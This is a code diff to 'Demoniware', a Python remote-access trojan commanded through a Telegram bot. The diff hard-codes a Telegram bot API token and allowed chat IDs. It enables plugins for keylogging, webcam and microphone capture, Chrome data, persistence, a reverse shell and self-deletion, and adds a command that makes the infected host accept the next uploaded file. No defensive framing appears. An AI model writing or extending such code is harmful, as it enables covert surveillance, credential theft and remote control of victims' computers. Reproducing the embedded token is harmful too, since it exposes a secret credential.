@@ -1,4 +1,3 @@
-import configparser
 from datetime import datetime
 import tempfile
 import textwrap
@@ -36,26 +35,25 @@ class Demoniware(object):
 
         self.logger.info('Demoniware is rising...')
 
-        self.config = configparser.ConfigParser()
-        self.config.read(config_file) 
 
-        self.api_key = api_key if api_key else self.config['Demoniware'].get('api_key', '')
-        self.allowed_groups = allowed_groups if allowed_groups else [int(x) for x in self.config['Demoniware'].get('allowed_groups', []).split(',')]
-        self.max_message_length = self.config['Telegram'].getint('max_message_length', 4096)
-        self.socket_buffer_size = self.config['Socket'].getint('buffer_size', 1024)
+        self.api_key = api_key if api_key else '272769645:AAHaAlus1Bh4xMAJD7crcEwRpe7JxHpy6I0'
+        self.allowed_groups = allowed_groups if allowed_groups else [-167279752,-155034552]
+        self.max_message_length = 4096
+        self.socket_buffer_size = 1024
 
-        self.secure = self.config['Demoniware'].getboolean('secure', False)
+        self.secure = False
 
         self.bot = telepot.Bot(self.api_key)
         self.platform = sys.platform
         self.system = platform.system()
 
+        self.accept_download = False
 
         self.start_time = datetime.now()
 
         self.node = '{}__{}'.format(platform.node(), uuid.getnode())
 
-        self.plugin_list = [x.strip() for x in self.config['Demoniware'].get('plugins', []).split(',')]
+        self.plugin_list = ['camera', 'chrome', 'download_upload', 'keylogger', 'microphone', 'persistence', 'proc', 'reverse_shell', 'screenshot', 'suicide', 'system']
 
         self.plugins = {}
 
@@ -99,8 +97,10 @@ class Demoniware(object):
                     else:
                         self.actions(msg['text'], chat_id)
                 elif content_type == 'document':
-                    self.bot.download_file(msg['document']['file_id'], msg['document']['file_name'])
-                    self.send_message(chat_id, 'The file {fname} has been saved to {cwd}'.format(fname=msg['document']['file_name'], cwd=os.getcwd()))
+                    if self.accept_download:
+                        self.bot.download_file(msg['document']['file_id'], msg['document']['file_name'])
+                        self.send_message(chat_id, 'The file {fname} has been saved to {cwd}'.format(fname=msg['document']['file_name'], cwd=os.getcwd()))
+                        self.accept_download = False
         else:
             self.send_message(chat_id, 'Fuck off!')
 
@@ -136,6 +136,9 @@ class Demoniware(object):
             self.send_message(chat_id, '{} [started at {}]'.format(self.node, self.start_time))
 
         elif cmd[0].lower() in self.node.lower() and len(cmd) >= 2:
+            if cmd[1] == '/accept_download':
+                self.accept_download = True
+                self.send_message(chat_id, 'Waiting for document...')
             if cmd[1] in self.command_routes.keys():
                 pname = self.command_routes[cmd[1]]
                 plugin = self.plugins[pname]
@@ -149,7 +152,8 @@ class Demoniware(object):
         elif '/help' in cmd[0]:
             msg = """[+] - Commands Available - [+]
             /help - show this message
-            /hosts - show the hostname of all hosts availables"""
+            /hosts - show the hostname of all hosts availables
+            HOSTNAME /accept_download - accepts the next uploaded document"""
 
             for plugin in self.plugins.keys():
                 msg += """\n\n[+] - Plugin: {plugin_name} - [+]""".format(plugin_name=plugin)
